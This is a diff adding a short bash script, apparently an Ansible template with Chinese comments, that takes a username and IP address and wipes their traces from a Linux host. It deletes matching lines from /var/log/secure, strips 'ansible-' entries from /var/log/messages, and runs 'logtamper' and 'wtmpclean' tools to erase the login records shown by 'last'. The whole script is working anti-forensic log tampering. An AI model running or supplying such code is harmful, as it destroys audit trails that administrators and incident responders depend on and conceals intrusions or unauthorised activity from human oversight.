@@ -1,0 +1,21 @@
+#!/bin/bash
+
+USER=$1
+IP=$2
+
+# 清除 secure记录
+lines=`sed -n "/$IP/=" /var/log/secure | sort -r`;
+for i in $lines; do
+  let startLine="$i-1"
+  lineAfter=5
+  let endLine="startLine + lineAfter"
+  sed -i $startLine','$endLine'd' /var/log/secure
+done
+
+# 清除 messages 记录
+sed -i '/ansible-/d' /var/log/messages
+
+# 清除last记录
+{{ scripts_path }}/logtamper -w $USER $IP 
+
+{{ scripts_path }}/wtmpclean -w $USER $IP 
